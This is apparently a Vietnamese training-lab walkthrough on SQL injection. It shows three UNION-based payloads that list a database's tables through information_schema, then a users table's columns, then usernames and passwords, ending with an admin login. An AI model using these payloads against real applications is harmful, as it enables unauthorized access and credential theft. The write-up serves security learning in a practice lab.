![image](https://user-images.githubusercontent.com/125866921/231399417-725a29d1-a796-462d-a7f2-c3f5ed7101d1.png)

  - Ở lab lần này ta vẫn thử cách ta đã dùng ở lab trước, và nó vẫn hoạt động như thế.
  - Nhưng ở phần lab này có 1 tí khác biệt nên ta sẽ sửa đổi 1 chút.
  - Sử dụng câu lệnh truy vấn sau:  

        ' UNION SELECT table_name, NULL FROM information_schema.tables --
        
      - Câu lệnh này cố gắng chèn thêm một câu lệnh SQL vào một truy vấn SQL hiện có để truy cập vào bảng thông tin hệ thống ``information_schema.tables``, trong đó lưu trữ thông tin về các bảng trong cơ sở dữ liệu.  
      - Câu lệnh ``SELECT`` được sử dụng để truy vấn các cột ``table_name`` và ``NULL`` từ bảng ``information_schema.tables``.  

![image](https://user-images.githubusercontent.com/125866921/231401758-111f6703-e794-4ece-8278-f3bd5343f9b5.png)

  - Nó hiện ra cho mình cả 1 đống như trên.  
  - Việc mình cần làm là tìm ra cột ``users``.  Có thể thấy ở đây ta có ``users_hagmbb``, cùng thử với cột này xem sao.  
  - Ta có câu lệnh truy vấn sau:  

        ' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_hagmbb' --
        
![image](https://user-images.githubusercontent.com/125866921/231403805-86ded0f1-5f62-433a-b3a2-a1d6267e24b0.png)

  - Tại đấy nó đã hiện ra ``username_swmxcd`` và ``password_gblfnm``.  
  - Ta note nó lại và tiếp tục thực hiện truy vấn.  
  - Câu lệnh truy vấn như sau:  

        ' UNION SELECT username_swmxcd, password_gblfnm FROM users_hagmbb --
        
![image](https://user-images.githubusercontent.com/125866921/231404444-f0ced5b9-e163-4242-b456-1013ce711c38.png)

  - Ta đã có được tài khoản của admin, giờ thì đăng nhập và hoàn thành lab thôi.  
